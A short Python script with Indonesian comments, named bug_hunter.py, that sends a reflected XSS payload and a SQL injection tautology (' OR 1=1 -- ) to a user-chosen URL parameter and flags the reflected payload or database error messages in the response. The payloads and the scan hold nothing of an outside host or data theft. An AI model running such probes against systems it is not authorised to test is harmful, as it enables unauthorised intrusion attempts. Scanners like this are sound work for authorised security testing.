import requests
import re
import sys

def check_xss(url, param):
    """Mencoba Reflected XSS."""
    print(f"[*] Menguji XSS pada parameter: {param}")
    payload = "<script>alert(1)</script>"
    
    # Membuat URL dengan payload
    full_url = f"{url}?{param}={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(full_url, timeout=10)
        
        # Cek apakah payload ada di response body
        if payload in response.text:
            print("=====================================================")
            print(f"[!!!] BUG DITEMUKAN: Reflected XSS")
            print(f"    URL: {full_url}")
            print(f"    Parameter: {param}")
            print(f"    Severity: Medium")
            print("=====================================================")
            return True
        else:
            print("[+] XSS tidak terdeteksi pada percobaan ini.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Error saat request: {e}")
        return False

def check_sqli(url, param):
    """Mencoba SQL Injection sederhana."""
    print(f"[*] Menguji SQLi pada parameter: {param}")
    # Payload sederhana untuk memicu error
    payload = "' OR 1=1 -- "
    
    # Membuat URL dengan payload
    full_url = f"{url}?{param}={requests.utils.quote(payload)}"
    
    try:
        response = requests.get(full_url, timeout=10)
        
        # Deteksi error database umum (contoh: MySQL/PostgreSQL error messages)
        if "mysql_fetch_array" in response.text or "syntax error" in response.text.lower():
            print("=====================================================")
            print(f"[!!!] BUG DITEMUKAN: SQL Injection (Error Based)")
            print(f"    URL: {full_url}")
            print(f"    Parameter: {param}")
            print(f"    Severity: Critical")
            print("=====================================================")
            return True
        else:
            print("[+] SQLi tidak terdeteksi pada percobaan ini.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Error saat request: {e}")
        return False

def main():
    if len(sys.argv) != 3:
        print("Penggunaan: python bug_hunter.py <target_url> <parameter_to_test>")
        print("Contoh: python bug_hunter.py http://test.com/page ?id")
        sys.exit(1)

    target_url = sys.argv[1]
    param = sys.argv[2]
    
    print(f"--- Memulai Bug Hunting pada {target_url} untuk parameter '{param}' ---")
    
    check_xss(target_url, param)
    check_sqli(target_url, param)
    
    print("\n--- Selesai ---")

if __name__ == "__main__":
    main()